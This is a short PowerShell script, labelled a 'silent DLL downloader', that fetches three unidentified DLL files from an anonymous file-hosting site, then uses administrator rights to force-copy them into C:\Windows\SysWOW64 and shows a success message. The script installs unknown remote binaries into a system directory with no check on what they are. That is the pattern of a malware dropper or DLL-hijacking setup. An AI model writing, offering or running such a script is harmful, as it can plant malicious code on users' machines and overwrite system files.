# Silent DLL downloader from Catbox + copy to SysWOW64
# Run as Administrator

$dlls = @(
    @{ Name = "file1.dll"; Url = "https://files.catbox.moe/77pg84.dll" },
    @{ Name = "file2.dll"; Url = "https://files.catbox.moe/enco8e.dll" },
    @{ Name = "file3.dll"; Url = "https://files.catbox.moe/jmp14d.dll" }
)

$temp = "$env:TEMP\CatboxDLLs"
New-Item -ItemType Directory -Path $temp -Force | Out-Null

foreach ($dll in $dlls) {
    $outPath = Join-Path $temp $dll.Name
    Invoke-WebRequest -Uri $dll.Url -OutFile $outPath -UseBasicParsing
}

foreach ($dll in $dlls) {
    Copy-Item -Path (Join-Path $temp $dll.Name) -Destination "C:\Windows\SysWOW64\$($dll.Name)" -Force
}

[System.Windows.MessageBox]::Show("All DLLs downloaded and installed successfully.", "Done", "OK", "Information")
